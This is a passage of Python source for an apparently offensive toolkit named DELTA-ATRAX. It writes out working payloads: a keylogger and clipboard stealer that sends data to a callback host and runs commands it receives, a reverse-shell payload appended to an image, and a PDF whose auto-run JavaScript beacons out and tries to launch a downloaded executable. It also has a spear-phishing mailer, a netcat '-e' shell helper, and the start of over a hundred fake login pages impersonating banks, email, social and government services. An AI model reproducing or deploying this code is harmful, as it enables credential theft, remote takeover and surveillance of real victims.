            "agent_id": AGENT_ID,
            "type": "keylog",
            "timestamp": datetime.datetime.now().isoformat(),
            "data": data,
            "system_info": get_system_info()
        }}
        
        try:
            requests.post(f"http://{{CALLBACK_HOST}}:{{CALLBACK_PORT}}/keylog", json=payload, timeout=5)
        except:
            pass
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((CALLBACK_HOST, CALLBACK_PORT))
            sock.send(json.dumps(payload).encode())
            sock.close()
        except:
            pass
    except:
        pass

def capture_screenshot():
    if not PYAUTOGUI_AVAILABLE:
        return None
    try:
        screenshot = pyautogui.screenshot()
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(os.environ.get('TEMP', '/tmp'), f"screenshot_{{timestamp}}.png")
        screenshot.save(screenshot_path)
        return screenshot_path
    except:
        return None

def monitor_clipboard():
    global last_clipboard
    if not PYPERCLIP_AVAILABLE:
        return
    while running:
        try:
            current = pyperclip.paste()
            if current and current != last_clipboard:
                last_clipboard = current
                send_data(f"CLIPBOARD: {{current}}")
        except:
            pass
        time.sleep(5)

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return {{
            "success": result.returncode == 0,
            "output": result.stdout if result.stdout else result.stderr,
            "exit_code": result.returncode
        }}
    except Exception as e:
        return {{"success": False, "output": str(e), "exit_code": -1}}

def main():
    global running
    
    # Send initial beacon
    send_data("AGENT_STARTED")
    
    # Start keylogger
    if PYNPUT_AVAILABLE:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    
    # Start clipboard monitor
    if PYPERCLIP_AVAILABLE:
        clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        clipboard_thread.start()
    
    # Main loop - poll for commands
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((CALLBACK_HOST, CALLBACK_PORT))
            
            # Send heartbeat
            sock.send(json.dumps({{"type": "heartbeat", "agent_id": AGENT_ID}}).encode())
            
            # Receive command
            data = sock.recv(4096).decode()
            if data:
                try:
                    command = json.loads(data)
                    if command.get("cmd"):
                        result = execute_command(command["cmd"])
                        sock.send(json.dumps({{"type": "result", "result": result}}).encode())
                    elif command.get("action") == "screenshot":
                        screenshot_path = capture_screenshot()
                        if screenshot_path:
                            with open(screenshot_path, 'rb') as f:
                                screenshot_data = base64.b64encode(f.read()).decode()
                            sock.send(json.dumps({{"type": "screenshot", "data": screenshot_data}}).encode())
                    elif command.get("action") == "stop":
                        running = False
                except:
                    pass
            
            sock.close()
        except:
            pass
        
        time.sleep(5)

if __name__ == "__main__":
    main()
'''
        
        with open(file_path, 'w') as f:
            f.write(payload_code)
        
        payload = MalwarePayload(
            id=payload_id,
            name=name,
            payload_type="keylogger",
            file_path=file_path,
            image_path=None,
            created_at=datetime.now().isoformat(),
            callback_host=callback_host,
            callback_port=callback_port
        )
        
        self.db.save_malware_payload(payload)
        return payload
    
    def generate_image_payload(self, name: str, image_path: str, callback_host: str = None,
                               callback_port: int = None) -> MalwarePayload:
        payload_id = str(uuid.uuid4())[:8]
        callback_host = callback_host or self.callback_host
        callback_port = callback_port or self.callback_port
        
        # Create steganographic payload embedded in image
        output_image = os.path.join(MALWARE_IMAGES_DIR, f"{name}_{payload_id}.png")
        
        try:
            # Copy image and append payload
            with open(image_path, 'rb') as f:
                image_data = f.read()
            
            # Create malicious payload
            payload_code = f'''
import os
import sys
import socket
import subprocess
import threading
import time
import json
import base64
import requests

CALLBACK_HOST = "{callback_host}"
CALLBACK_PORT = {callback_port}

def execute_and_report():
    try:
        # Get system info
        import platform
        info = {{
            "hostname": socket.gethostname(),
            "os": platform.system() + " " + platform.release(),
            "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown"
        }}
        
        # Try to connect back
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((CALLBACK_HOST, CALLBACK_PORT))
        sock.send(json.dumps(info).encode())
        
        while True:
            cmd = sock.recv(4096).decode()
            if not cmd:
                break
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            sock.send((result.stdout + result.stderr).encode())
        
        sock.close()
    except:
        pass

if __name__ == "__main__":
    execute_and_report()
'''
            
            # Encode payload
            encoded_payload = base64.b64encode(payload_code.encode())
            
            # Append to image (steganography)
            with open(output_image, 'wb') as f:
                f.write(image_data)
                f.write(b'\n---DELTA_ATRAX_PAYLOAD---\n')
                f.write(encoded_payload)
            
            payload = MalwarePayload(
                id=payload_id,
                name=name,
                payload_type="image",
                file_path=output_image,
                image_path=image_path,
                created_at=datetime.now().isoformat(),
                callback_host=callback_host,
                callback_port=callback_port
            )
            
            self.db.save_malware_payload(payload)
            return payload
            
        except Exception as e:
            logger.error(f"Image payload generation error: {e}")
            return None
    
    def generate_pdf_payload(self, name: str, callback_host: str = None,
                             callback_port: int = None) -> MalwarePayload:
        payload_id = str(uuid.uuid4())[:8]
        callback_host = callback_host or self.callback_host
        callback_port = callback_port or self.callback_port
        
        file_name = f"{name}_{payload_id}.pdf"
        file_path = os.path.join(MALWARE_DIR, file_name)
        
        # PDF with embedded JavaScript payload
        pdf_content = f'''%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Action /S /JavaScript /JS (
  var host = "{callback_host}";
  var port = {callback_port};
  var agent_id = "DELTA_ATRAX_{payload_id}";
  
  // Beacon back to C2
  try {{
    var req = new XMLHttpRequest();
    req.open("GET", "http://" + host + ":" + port + "/pdf/beacon/" + agent_id, false);
    req.send();
  }} catch(e) {{ }}
  
  // Attempt to download and execute
  try {{
    var req2 = new XMLHttpRequest();
    req2.open("GET", "http://" + host + ":" + port + "/pdf/payload/" + agent_id, false);
    req2.send();
    if (req2.responseText) {{
      app.launchURL("file:///C:/Windows/Temp/update.exe");
    }}
  }} catch(e) {{ }}
) >>
endobj
4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>
endobj
5 0 obj
<< /Length 200 >>
stream
BT
/F1 24 Tf
100 700 Td
(DELTA-ATRAX Security Document) Tj
/F1 12 Tf
100 650 Td
(Please enable JavaScript to view this document properly.) Tj
ET
endstream
endobj
xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000145 00000 n
0000000220 00000 n
0000000330 00000 n
trailer
<< /Size 6 /Root 1 0 R >>
startxref
600
%%EOF
'''
        
        with open(file_path, 'w') as f:
            f.write(pdf_content)
        
        payload = MalwarePayload(
            id=payload_id,
            name=name,
            payload_type="pdf",
            file_path=file_path,
            image_path=None,
            created_at=datetime.now().isoformat(),
            callback_host=callback_host,
            callback_port=callback_port
        )
        
        self.db.save_malware_payload(payload)
        return payload
    
    def list_payloads(self) -> List[Dict]:
        return self.db.get_malware_payloads()

# =====================
# REVERSE ENGINEERING TOOLS
# =====================
class ReverseEngineeringTools:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.strings_min_length = 4
    
    def extract_strings(self, file_path: str, min_length: int = None) -> str:
        min_length = min_length or self.strings_min_length
        job_id = str(uuid.uuid4())[:8]
        
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Extract ASCII strings
            ascii_strings = re.findall(rb'[ -~]{%d,}' % min_length, data)
            ascii_strings = [s.decode('ascii', errors='ignore') for s in ascii_strings]
            
            # Extract Unicode strings
            unicode_strings = re.findall(rb'(?:[\x20-\x7e]\x00){%d,}' % min_length, data)
            unicode_strings = [s.decode('utf-16-le', errors='ignore') for s in unicode_strings]
            
            result = "=== ASCII Strings ===\n"
            result += "\n".join(ascii_strings[:500])
            result += "\n\n=== Unicode Strings ===\n"
            result += "\n".join(unicode_strings[:500])
            
            self.db.save_re_job(job_id, file_path, 'strings', result)
            
            output_path = os.path.join(REVERSE_ENGINEERING_DIR, f"strings_{job_id}.txt")
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(result)
            
            return result
        except Exception as e:
            return f"Error: {e}"
    
    def hex_dump(self, file_path: str, offset: int = 0, length: int = 256) -> str:
        job_id = str(uuid.uuid4())[:8]
        
        try:
            with open(file_path, 'rb') as f:
                f.seek(offset)
                data = f.read(length)
            
            result = f"Hex dump of {file_path} (offset: {offset}, length: {length}):\n"
            result += "=" * 70 + "\n"
            
            for i in range(0, len(data), 16):
                chunk = data[i:i+16]
                hex_part = ' '.join(f'{b:02x}' for b in chunk)
                ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
                result += f"{offset + i:08x}  {hex_part:<48}  {ascii_part}\n"
            
            self.db.save_re_job(job_id, file_path, 'hexdump', result)
            
            return result
        except Exception as e:
            return f"Error: {e}"
    
    def analyze_metadata(self, file_path: str) -> str:
        job_id = str(uuid.uuid4())[:8]
        
        try:
            result = f"File Analysis: {file_path}\n"
            result += "=" * 50 + "\n"
            
            stat = os.stat(file_path)
            result += f"Size: {stat.st_size} bytes\n"
            result += f"Created: {datetime.fromtimestamp(stat.st_ctime)}\n"
            result += f"Modified: {datetime.fromtimestamp(stat.st_mtime)}\n"
            result += f"Permissions: {oct(stat.st_mode)[-3:]}\n"
            
            with open(file_path, 'rb') as f:
                magic = f.read(4)
            
            magic_hex = binascii.hexlify(magic).decode()
            result += f"Magic bytes: {magic_hex}\n"
            
            # Calculate hashes
            result += "\nHashes:\n"
            with open(file_path, 'rb') as f:
                data = f.read()
            result += f"  MD5: {hashlib.md5(data).hexdigest()}\n"
            result += f"  SHA1: {hashlib.sha1(data).hexdigest()}\n"
            result += f"  SHA256: {hashlib.sha256(data).hexdigest()}\n"
            
            self.db.save_re_job(job_id, file_path, 'metadata', result)
            
            return result
        except Exception as e:
            return f"Error: {e}"

# =====================
# SPEAR PHISHING ENGINE
# =====================
class SpearPhishingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def create_campaign(self, name: str, template: str, subject: str, from_email: str,
                       targets: List[Dict], scheduled_time: str = None) -> SpearPhishingCampaign:
        campaign = SpearPhishingCampaign(
            id=str(uuid.uuid4())[:8],
            name=name,
            template=template,
            subject=subject,
            from_email=from_email,
            targets=targets,
            scheduled_time=scheduled_time,
            created_at=datetime.now().isoformat()
        )
        self.db.save_spear_phishing_campaign(campaign)
        return campaign
    
    def send_campaign(self, campaign_id: str) -> Dict:
        campaigns = self.db.get_spear_phishing_campaigns()
        campaign_data = next((c for c in campaigns if c['id'] == campaign_id), None)
        if not campaign_data:
            return {'success': False, 'error': 'Campaign not found'}
        
        smtp_server = self.config.get('email.smtp_server', '')
        smtp_port = self.config.get('email.smtp_port', 587)
        smtp_username = self.config.get('email.smtp_username', '')
        smtp_password = self.config.get('email.smtp_password', '')
        
        if not smtp_server:
            return {'success': False, 'error': 'SMTP server not configured'}
        
        sent_count = 0
        targets = json.loads(campaign_data['targets']) if campaign_data['targets'] else []
        
        for target in targets:
            try:
                msg = email.message.EmailMessage()
                msg['Subject'] = campaign_data['subject']
                msg['From'] = campaign_data['from_email']
                msg['To'] = target.get('email', '')
                
                template = campaign_data['template']
                for key, value in target.items():
                    template = template.replace(f"{{{{{key}}}}}", str(value))
                
                if '<html' in template.lower():
                    msg.set_content(template, subtype='html')
                else:
                    msg.set_content(template)
                
                with smtplib.SMTP(smtp_server, smtp_port) as server:
                    server.starttls()
                    server.login(smtp_username, smtp_password)
                    server.send_message(msg)
                
                sent_count += 1
            except Exception as e:
                print(f"Failed to send to {target.get('email', 'unknown')}: {e}")
        
        self.db.conn.execute(
            "UPDATE spear_phishing_campaigns SET sent_count = ?, status = 'sent' WHERE id = ?",
            (sent_count, campaign_id)
        )
        self.db.conn.commit()
        
        return {
            'success': True,
            'campaign_id': campaign_id,
            'sent_count': sent_count,
            'total_targets': len(targets)
        }

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
    
    def is_available(self) -> bool:
        return PARAMIKO_AVAILABLE
    
    def add_connection(self, name: str, host: str, username: str,
                      password: str = None, key_path: str = None,
                      port: int = 22) -> SSHConnection:
        conn_id = str(uuid.uuid4())[:8]
        conn = SSHConnection(
            id=conn_id,
            name=name,
            host=host,
            port=port,
            username=username,
            password=password,
            key_path=key_path,
            created_at=datetime.now().isoformat()
        )
        self.db.add_ssh_connection(conn)
        return conn
    
    def connect(self, conn_id: str) -> bool:
        if not self.is_available():
            return False
        
        rows = self.db.get_ssh_connections()
        conn_data = next((c for c in rows if c['id'] == conn_id), None)
        if not conn_data:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': conn_data['host'],
                'port': conn_data['port'],
                'username': conn_data['username'],
                'timeout': 30
            }
            
            if conn_data['password_encrypted']:
                connect_kwargs['password'] = conn_data['password_encrypted']
            elif conn_data['key_path'] and os.path.exists(conn_data['key_path']):
                connect_kwargs['key_filename'] = conn_data['key_path']
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            
            self.db.conn.execute(
                "UPDATE ssh_connections SET status = 'connected', last_used = CURRENT_TIMESTAMP WHERE id = ?",
                (conn_id,)
            )
            self.db.conn.commit()
            return True
        except Exception as e:
            print(f"SSH connection error: {e}")
            return False
    
    def disconnect(self, conn_id: str):
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        
        self.db.conn.execute(
            "UPDATE ssh_connections SET status = 'disconnected' WHERE id = ?",
            (conn_id,)
        )
        self.db.conn.commit()
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> CommandResult:
        start_time = time.time()
        
        if conn_id not in self.connections:
            if not self.connect(conn_id):
                return CommandResult(False, "", 0, "Not connected")
        
        client = self.connections[conn_id]
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            execution_time = time.time() - start_time
            
            self.db.log_ssh_command(conn_id, command, output, exit_code, execution_time)
            
            return CommandResult(
                success=exit_code == 0,
                output=output + ("\n" + error if error else ""),
                execution_time=execution_time,
                error=None if exit_code == 0 else error
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(False, "", execution_time, str(e))
    
    def get_connections(self) -> List[Dict]:
        rows = self.db.get_ssh_connections()
        for row in rows:
            row['connected'] = row['id'] in self.connections
        return rows

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
        start_time = time.time()
        try:
            scan_map = {
                "quick": ['nmap', '-T4', '-F', target],
                "full": ['nmap', '-p-', target],
                "service": ['nmap', '-sV', target],
                "os": ['nmap', '-O', target],
                "udp": ['nmap', '-sU', target],
                "vuln": ['nmap', '--script', 'vuln', target],
                "stealth": ['nmap', '-sS', '-T2', target],
                "aggressive": ['nmap', '-A', '-T4', target],
                "comprehensive": ['nmap', '-sS', '-sV', '-O', '-p-', target],
                "ping": ['nmap', '-sn', target]
            }
            cmd = scan_map.get(scan_type, ['nmap', target])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if method.upper() == "GET":
                cmd = ['curl', '-s', url]
            elif method.upper() == "POST":
                cmd = ['curl', '-s', '-X', 'POST', '-d', data or '', url]
            else:
                cmd = ['curl', '-s', '-X', method, url]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def wget(url: str, output: str = None) -> CommandResult:
        start_time = time.time()
        try:
            cmd = ['wget', '-q']
            if output:
                cmd.extend(['-O', output])
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
                else:
                    cmd = ['traceroute', '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat(host: str, port: int, command: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('nc'):
                if command:
                    cmd = ['nc', host, str(port), '-e', command]
                else:
                    cmd = ['nc', '-zv', host, str(port)]
            elif shutil.which('ncat'):
                if command:
                    cmd = ['ncat', host, str(port), '-e', command]
                else:
                    cmd = ['ncat', '-zv', host, str(port)]
            else:
                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def ip_to_domain(ip: str) -> Optional[str]:
        try:
            domain = socket.gethostbyaddr(ip)[0]
            if domain:
                return domain
        except:
            pass
        return None
    
    @staticmethod
    def domain_to_ip(domain: str) -> Optional[str]:
        try:
            ip = socket.gethostbyname(domain)
            if ip:
                return ip
        except:
            pass
        return None
    
    @staticmethod
    def block_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=DELTA_ATRAX_Block_{ip}', 'dir=in', 'action=block',
                               f'remoteip={ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=DELTA_ATRAX_Block_{ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False

# =====================
# SOCIAL ENGINEERING TOOLS (100+ Templates)
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = None
        self.active_links = {}
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict:
        """Load 100+ phishing templates"""
        templates = {}
        
        # Social Media Templates
        social_media = [
            ('facebook', '#1877f2', 'Facebook'),
            ('instagram', '#0095f6', 'Instagram'),
            ('twitter', '#1d9bf0', 'X / Twitter'),
            ('linkedin', '#0a66c2', 'LinkedIn'),
            ('snapchat', '#fffc00', 'Snapchat'),
            ('tiktok', '#fe2c55', 'TikTok'),
            ('reddit', '#ff4500', 'Reddit'),
            ('pinterest', '#e60023', 'Pinterest'),
            ('tumblr', '#36465d', 'Tumblr'),
            ('flickr', '#ff0084', 'Flickr'),
            ('youtube', '#ff0000', 'YouTube'),
            ('twitch', '#9146ff', 'Twitch'),
            ('discord', '#5865f2', 'Discord'),
            ('telegram', '#2aabee', 'Telegram'),
            ('whatsapp', '#25d366', 'WhatsApp'),
            ('wechat', '#07c160', 'WeChat'),
            ('line', '#00c300', 'LINE'),
            ('viber', '#7360f2', 'Viber'),
            ('mastodon', '#6364ff', 'Mastodon'),
            ('threads', '#000000', 'Threads')
        ]
        
        for name, color, display in social_media:
            templates[name] = self._social_template(display, color)
        
        # Email Provider Templates
        email_providers = [
            ('gmail', '#1a73e8', 'Gmail'),
            ('yahoo', '#410093', 'Yahoo Mail'),
            ('outlook', '#0078d4', 'Outlook'),
            ('protonmail', '#505061', 'ProtonMail'),
            ('zoho', '#e42527', 'Zoho Mail'),
            ('icloud', '#0071e3', 'iCloud'),
            ('aol', '#ff0b00', 'AOL Mail'),
            ('gmx', '#1c449b', 'GMX'),
            ('mailcom', '#0066cc', 'Mail.com'),
            ('yandex', '#ff0000', 'Yandex Mail')
        ]
        
        for name, color, display in email_providers:
            templates[name] = self._social_template(display, color)
        
        # Tech Company Templates
        tech_companies = [
            ('microsoft', '#0078d4', 'Microsoft'),
            ('google', '#4285f4', 'Google'),
            ('apple', '#0071e3', 'Apple'),
            ('amazon', '#ff9900', 'Amazon'),
            ('github', '#24292f', 'GitHub'),
            ('gitlab', '#fc6d26', 'GitLab'),
            ('bitbucket', '#0052cc', 'Bitbucket'),
            ('adobe', '#ff0000', 'Adobe'),
            ('dropbox', '#0061ff', 'Dropbox'),
            ('slack', '#611f69', 'Slack'),
            ('zoom', '#2d8cff', 'Zoom'),
            ('teams', '#5059e8', 'Microsoft Teams'),
            ('onedrive', '#0078d4', 'OneDrive'),
            ('office365', '#0078d4', 'Office 365'),
            ('salesforce', '#00a1e0', 'Salesforce')
        ]
        
        for name, color, display in tech_companies:
            templates[name] = self._social_template(display, color)
        
        # Financial Templates
        financial = [
            ('paypal', '#0070ba', 'PayPal'),
            ('venmo', '#008cff', 'Venmo'),
            ('cashapp', '#00d632', 'Cash App'),
            ('chase', '#1174c2', 'Chase'),
            ('wellsfargo', '#bc1f2c', 'Wells Fargo'),
            ('bankofamerica', '#e31837', 'Bank of America'),
            ('citibank', '#003b70', 'Citibank'),
            ('capitalone', '#004977', 'Capital One'),
            ('americanexpress', '#006fcf', 'American Express'),
            ('discover', '#ff6000', 'Discover'),
            ('barclays', '#00aeef', 'Barclays'),
            ('hsbc', '#db0011', 'HSBC'),
            ('revolut', '#0075eb', 'Revolut'),
            ('monzo', '#ff3464', 'Monzo'),
            ('stripe', '#635bff', 'Stripe'),
            ('square', '#000000', 'Square'),
            ('coinbase', '#0052ff', 'Coinbase'),
            ('binance', '#f0b90b', 'Binance'),
            ('kraken', '#5741d9', 'Kraken'),
            ('metamask', '#f6851b', 'MetaMask')
        ]
        
        for name, color, display in financial:
            templates[name] = self._social_template(display, color)
        
        # Gaming Templates
        gaming = [
            ('steam', '#67c1f5', 'Steam'),
            ('epicgames', '#000000', 'Epic Games'),
            ('roblox', '#e32c2c', 'Roblox'),
            ('minecraft', '#6b8c42', 'Minecraft'),
            ('xbox', '#107c10', 'Xbox'),
            ('playstation', '#003791', 'PlayStation'),
            ('nintendo', '#e60012', 'Nintendo'),
            ('battlenet', '#0074e0', 'Battle.net'),
            ('ubisoft', '#0070ff', 'Ubisoft'),
            ('ea', '#ff0000', 'EA Games')
        ]
        
        for name, color, display in gaming:
            templates[name] = self._social_template(display, color)
        
        # Dating Templates
        dating = [
            ('tinder', '#ff5a60', 'Tinder'),
            ('bumble', '#ff6b6b', 'Bumble'),
            ('hinge', '#1a1a1a', 'Hinge'),
            ('okcupid', '#ff4e6b', 'OkCupid'),
            ('match', '#ff6b6b', 'Match.com'),
            ('plentyoffish', '#ff6b6b', 'Plenty of Fish'),
            ('grindr', '#ffcc00', 'Grindr'),
            ('her', '#ff6b6b', 'HER'),
            ('coffeemeetsbagel', '#ff6b6b', 'Coffee Meets Bagel'),
            ('happn', '#ff6b6b', 'Happn')
        ]
        
        for name, color, display in dating:
            templates[name] = self._social_template(display, color)
        
        # Streaming Templates
        streaming = [
            ('netflix', '#e50914', 'Netflix'),
            ('spotify', '#1ed760', 'Spotify'),
            ('hulu', '#1ce783', 'Hulu'),
            ('disneyplus', '#113ccf', 'Disney+'),
            ('hbomax', '#5822b4', 'HBO Max'),
            ('primevideo', '#00a8e1', 'Prime Video'),
            ('appletv', '#000000', 'Apple TV+'),
            ('paramount', '#0064ff', 'Paramount+'),
            ('peacock', '#000000', 'Peacock'),
            ('crunchyroll', '#f47521', 'Crunchyroll')
        ]
        
        for name, color, display in streaming:
            templates[name] = self._social_template(display, color)
        
        # Shopping Templates
        shopping = [
            ('ebay', '#e53238', 'eBay'),
            ('walmart', '#0071dc', 'Walmart'),
            ('target', '#cc0000', 'Target'),
            ('bestbuy', '#0046be', 'Best Buy'),
            ('etsy', '#f1641e', 'Etsy'),
            ('aliexpress', '#ff6a00', 'AliExpress'),
            ('alibaba', '#ff6a00', 'Alibaba'),
            ('wish', '#2fb7ec', 'Wish'),
            ('shein', '#000000', 'Shein'),
            ('temu', '#fb7701', 'Temu')
        ]
        
        for name, color, display in shopping:
            templates[name] = self._social_template(display, color)
        
        # Cloud & Services Templates
        cloud = [
            ('aws', '#ff9900', 'AWS'),
            ('azure', '#0078d4', 'Azure'),
            ('gcp', '#4285f4', 'Google Cloud'),
            ('digitalocean', '#0080ff', 'DigitalOcean'),
            ('cloudflare', '#f38020', 'Cloudflare'),
            ('namecheap', '#de3723', 'Namecheap'),
            ('godaddy', '#00a4a6', 'GoDaddy'),
            ('heroku', '#430098', 'Heroku'),
            ('vercel', '#000000', 'Vercel'),
            ('netlify', '#00c7b7', 'Netlify')
        ]
        
        for name, color, display in cloud:
            templates[name] = self._social_template(display, color)
        
        # Education Templates
        education = [
            ('coursera', '#0056d2', 'Coursera'),
            ('udemy', '#a435f0', 'Udemy'),
            ('edx', '#02262b', 'edX'),
            ('khanacademy', '#14bf96', 'Khan Academy'),
            ('duolingo', '#58cc71', 'Duolingo')
        ]
        
        for name, color, display in education:
            templates[name] = self._social_template(display, color)
        
        # Government Templates
        government = [
            ('irs', '#003366', 'IRS'),
            ('dmv', '#003366', 'DMV'),
            ('usps', '#333366', 'USPS'),
            ('fedex', '#4d148c', 'FedEx'),
            ('ups', '#351c15', 'UPS')
        ]
        
        for name, color, display in government:
            templates[name] = self._social_template(display, color)
        
        # VPN & Security Templates
        vpn_security = [
            ('nordvpn', '#4687ff', 'NordVPN'),
            ('expressvpn', '#da3940', 'ExpressVPN'),
            ('surfshark', '#1ebfbf', 'Surfshark'),
            ('lastpass', '#d32d27', 'LastPass'),
            ('1password', '#0572ec', '1Password')
        ]
        
        for name, color, display in vpn_security:
            templates[name] = self._social_template(display, color)
        
        # Custom template
        templates['custom'] = self._custom_template()
        
        return templates
    
    def _social_template(self, display_name: str, color: str) -> str:
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>{display_name} - Login</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0a1e 0%, #1a1a3e 50%, #0a0a1e 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        .login-container {{
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 40px;
            width: 400px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .logo-text {{
            font-size: 32px;
            font-weight: bold;
            color: {color};
            text-shadow: 0 0 20px {color};
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        input {{
            width: 100%;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            transition: all 0.3s;
        }}
        input:focus {{
            outline: none;
            border-color: {color};
            box-shadow: 0 0 15px {color}40;
        }}
        input::placeholder {{
